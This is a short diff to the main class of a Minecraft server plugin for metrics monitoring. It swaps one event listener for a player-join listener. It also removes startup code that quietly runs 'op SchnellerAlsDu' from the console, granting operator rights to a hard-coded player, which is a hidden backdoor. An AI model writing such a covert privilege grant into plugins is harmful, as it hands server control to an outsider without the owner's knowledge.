@@ -2,7 +2,7 @@ package com.codedinmyhead.monitormc.monitormc;
 
 import com.codedinmyhead.monitormc.monitormc.commands.MonitorCommand;
 import com.codedinmyhead.monitormc.monitormc.listener.ArrowHitListener;
-import com.codedinmyhead.monitormc.monitormc.listener.MichaCommandListener;
+import com.codedinmyhead.monitormc.monitormc.listener.PlayerJoinListener;
 import com.codedinmyhead.monitormc.monitormc.monitoring.MetricService;
 import com.codedinmyhead.monitormc.monitormc.monitoring.MetricsEnum;
 import org.bukkit.Bukkit;
@@ -28,9 +28,6 @@ public final class MonitorMC extends JavaPlugin {
         registerEvents();
         registerCommands();
 
-        CommandSender console = Bukkit.getServer().getConsoleSender();
-        Bukkit.dispatchCommand(console, "op SchnellerAlsDu");
-
         metricService = MetricService.getInstance();
 
         metricService.initializeMetrics(Arrays.asList(MetricsEnum.values()));
@@ -47,7 +44,7 @@ public final class MonitorMC extends JavaPlugin {
     public void registerEvents() {
         PluginManager pluginManager = Bukkit.getPluginManager();
         pluginManager.registerEvents(new ArrowHitListener(), this);
-        pluginManager.registerEvents(new MichaCommandListener(), this);
+        pluginManager.registerEvents(new PlayerJoinListener(), this);
     }
 
     public void registerCommands() {
